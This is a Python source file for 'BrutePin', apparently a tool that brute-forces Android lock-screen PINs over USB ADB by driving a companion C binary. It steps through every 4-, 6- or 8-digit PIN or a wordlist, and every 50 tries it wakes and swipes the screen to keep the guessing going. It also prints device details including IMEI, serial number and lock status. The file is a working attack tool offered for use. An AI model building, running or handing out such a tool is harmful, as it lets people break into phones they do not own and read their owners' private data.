#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BrutePin Py3 v1.1 — Python frontend.
Semua ADB/USB via C binary native protocol.
"""

import json
import os
import subprocess
import sys
import threading
import time

R = "\033[0;31m"; G = "\033[0;32m"; Y = "\033[1;33m"; C = "\033[0;36m"; B = "\033[1m"; N = "\033[0m"
SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

CORE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "core")
C_BIN = os.path.join(CORE_DIR, "brutepin")


def _getch():
    import termios, tty
    fd = sys.stdin.fileno(); old = termios.tcgetattr(fd)
    try: tty.setraw(fd); return sys.stdin.read(1)
    finally: termios.tcsetattr(fd, termios.TCSADRAIN, old)

def getch():
    if os.name == "nt":
        import msvcrt; return msvcrt.getch().decode()
    return _getch()


def cbin(cmd, timeout=15):
    try:
        r = subprocess.run([C_BIN] + cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.returncode
    except: return "", -1


def select_menu(items, prompt="Select:"):
    sel = 0; n = len(items)
    print(f"\n  {B}{prompt}{N}\n")
    for i, item in enumerate(items):
        hl = "\033[7m" if i == sel else " "; print(f"     {hl} {item} \033[0m")
    while True:
        k = getch()
        if k == "\x1b":
            k2 = getch()
            if k2 == "[":
                k3 = getch()
                if k3 == "A": sel = (sel - 1) % n
                elif k3 == "B": sel = (sel + 1) % n
        elif k in ("\r", "\n"): break
        elif k == "\x03": raise KeyboardInterrupt
        for _ in range(n): sys.stdout.write("\033[F\033[K")
        for i, item in enumerate(items):
            hl = "\033[7m" if i == sel else " "
            sys.stdout.write(f"     {hl} {item} \033[0m\n")
        sys.stdout.flush()
    for _ in range(n + 1): sys.stdout.write("\033[F\033[K")
    sys.stdout.flush(); return sel


class Spinner:
    def __init__(self, msg="Working"): self.msg = msg; self._r = False; self._t = None
    def __enter__(self): self.start(); return self
    def __exit__(self, *a): self.stop()
    def _spin(self):
        i = 0
        while self._r:
            sys.stdout.write(f"\r  {SPIN[i%len(SPIN)]} {self.msg}... "); sys.stdout.flush()
            time.sleep(0.1); i += 1
    def start(self):
        self._r = True; self._t = threading.Thread(target=self._spin, daemon=True); self._t.start()
    def stop(self):
        self._r = False
        if self._t: self._t.join()
        sys.stdout.write("\r" + " " * 60 + "\r"); sys.stdout.flush()


def scan_usb():
    sp = "/sys/bus/usb/devices"
    if not os.path.isdir(sp): return []
    av = {"18d1","04e8","2717","12d1","22d9","2d95","1004","054c","22b8","0421","2a70","0e8d","05c6"}
    out = []
    for name in os.listdir(sp):
        if "-" not in name and ":" not in name and "usb" not in name: continue
        dp = os.path.join(sp, name)
        if not os.path.isdir(dp): continue
        def rf(f):
            try:
                with open(os.path.join(dp, f), "r", errors="replace") as fp: return fp.read().strip()
            except: return ""
        vid = rf("idVendor").lower()
        if vid in av:
            out.append({"vid": vid, "pid": rf("idProduct").lower(), "man": rf("manufacturer"),
                        "prod": rf("product"), "serial": rf("serial")})
    return out


BANNER = R + """
  ██████  ██████  ██    ██ ████████ ███████  ██████  ██ ███    ██
  ██   ██ ██   ██ ██    ██    ██    ██      ██       ██ ████   ██
  ██████  ██████  ██    ██    ██    █████   ██   ███ ██ ██ ██  ██
  ██   ██ ██   ██ ██    ██    ██    ██      ██    ██ ██ ██  ██ ██
  ██████  ██   ██  ██████     ██    ███████  ██████  ██ ██   ████
""" + N + """  Pure Native — tanpa ADB binary, langsung USB
  =================================================================
"""


def deep_scan():
    out, code = cbin(["--deep-scan"])
    if code != 0: return None, ""
    if "-----JSON_BEGIN-----" in out:
        json_str = out.split("-----JSON_BEGIN-----")[1].strip()
        try: return json.loads(json_str), out.split("-----JSON_BEGIN-----")[0].strip()
        except: return {}, ""
    return {}, ""


def print_device_info(info):
    if not info: return
    print(f"\n{'='*60}")
    print(f"  {B}VENDOR / MODEL{N}")
    print(f"    Vendor        : {info.get('vendor','?')}")
    print(f"    Model         : {info.get('model','?')}")
    print(f"    Serial        : {info.get('serial','?')}")
    print(f"    Chipset       : {info.get('chipset_vendor','?')} {info.get('chipset_name','?')}")
    print(f"    Platform      : {info.get('platform','?')}")
    print(f"    Hardware      : {info.get('hardware','?')}")
    print(f"    Android       : {info.get('android','?')} (SDK {info.get('sdk','?')})")
    print(f"    Security Patch: {info.get('security_patch','?')}")
    print(f"    Kernel        : {info.get('kernel','?')}")
    print(f"    SELinux       : {info.get('selinux','?')}")
    print(f"    Screen        : {info.get('screen','?')} @ {info.get('density','?')} dpi")
    print(f"    CPU           : {info.get('cpu_abi','?')} | {info.get('cpu_cores','?')} cores")
    print(f"    RAM           : {info.get('ram','?')}")
    print(f"    Storage       : {info.get('storage','?')}")
    print(f"    Battery       : {info.get('battery','?')}%")
    print(f"    IMEI1         : {info.get('imei1','?')}")
    lt = info.get('lock_type','?')
    locked = info.get('locked', False)
    print(f"    Lock Type     : {lt}")
    print(f"    Status        : {R+'LOCKED'+N if locked else G+'UNLOCKED'+N}")
    print(f"{'='*60}\n")


def brute_sequential(digits, delay_ms, start=0, end=0):
    total = 10 ** digits
    s = max(start, 0)
    e = min(end, total) if end > 0 else total
    if s <= 0 and e >= total: e = total
    print(f"\n  {B}[*]{N} {digits}-digit: {e-s:,} PINs | {delay_ms}ms\n")
    t0 = time.time()
    lockout_count = 0
    for i in range(s, e):
        pin = f"{i:0{digits}d}"
        if (i - s) % 50 == 0 and i > s:
            cbin(["--adb-shell", "input keyevent 224"], timeout=5); time.sleep(0.2)
            cbin(["--adb-shell", "input swipe 500 1500 500 500 200"], timeout=5); time.sleep(0.15)
        out, code = cbin(["--try-pin", pin], timeout=10)
        if code == 0:
            elapsed = time.time() - t0
            print(f"\n\n{G}[!!!] PIN FOUND: {pin}{N} ({elapsed:.0f}s)")
            return True
        if delay_ms > 0: time.sleep(delay_ms / 1000.0)
        elapsed = time.time() - t0; done = i - s + 1
        sys.stdout.write(f"\r  {done:,}/{e-s:,} | {pin} | {done/elapsed:.0f}/s | {elapsed:.0f}s  ")
        sys.stdout.flush()
    print(f"\n{Y}[-] Not found.{N}")
    return False


def brute_wordlist(path, delay_ms):
    try:
        with open(path) as f:
            pins = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except IOError as e:
        print(f"  {R}[-]{N} {e}"); return False
    total = len(pins)
    if total == 0: print(f"  {Y}[-]{N} Empty."); return False
    print(f"\n  {B}[*]{N} Wordlist: {total:,} entries")
    t0 = time.time()
    for idx, pin in enumerate(pins):
        if (idx + 1) % 50 == 0:
            cbin(["--adb-shell", "input keyevent 224"], timeout=5); time.sleep(0.2)
            cbin(["--adb-shell", "input swipe 500 1500 500 500 200"], timeout=5); time.sleep(0.15)
        out, code = cbin(["--try-pin", pin], timeout=10)
        if code == 0:
            elapsed = time.time() - t0
            print(f"\n\n{G}[!!!] FOUND: {pin}{N} ({elapsed:.0f}s/{idx+1})")
            return True
        if delay_ms > 0: time.sleep(delay_ms / 1000.0)
        elapsed = time.time() - t0
        sys.stdout.write(f"\r  [WL] {idx+1}/{total} {pin} | {elapsed:.0f}s  "); sys.stdout.flush()
    print(f"\n{Y}[-] Not found.{N}"); return False


def interactive(no_banner=False):
    if not no_banner: print(BANNER)
    usb = scan_usb()
    if usb:
        for d in usb[:3]:
            print(f"  USB: {d['vid']}:{d['pid']} {d.get('man','?')} {d.get('prod','?')}")
    else:
        print(f"  {Y}[!]{N} No USB detected.")
    print(f"  {B}[*]{N} Connecting via C binary native USB ADB...")
    out, code = cbin(["--adb-shell", "echo ADB_OK"])
    if "ADB_OK" not in out:
        print(f"  {R}[-]{N} No ADB. Enable USB debugging.")
        return
    print(f"  {G}[+]{N} Connected!\n")
    info, _ = deep_scan()
    if info: print_device_info(info)
    while True:
        items = ["4-digit PIN  (0000-9999)", "6-digit PIN  (000000-999999)",
                 "8-digit PIN  (00000000-99999999)", "Wordlist brute", "Quit"]
        sel = select_menu(items, "Select:")
        if sel == 4: break
        if sel == 3:
            path = input("  Path: ").strip()
            if path: brute_wordlist(path, 3)
            continue
        brute_sequential([4, 6, 8][sel], 3)


def main():
    import argparse
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("mode", nargs="?", default="")
    p.add_argument("--no-banner", action="store_true")
    p.add_argument("-d", "--delay", type=int, default=3)
    args, _ = p.parse_known_args()
    if args.mode in ("4","6","8"):
        brute_sequential(int(args.mode), args.delay)
    else:
        interactive(no_banner=args.no_banner)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{Y}[-] Interrupted.{N}"); sys.exit(1)
    except BrokenPipeError: sys.exit(1)
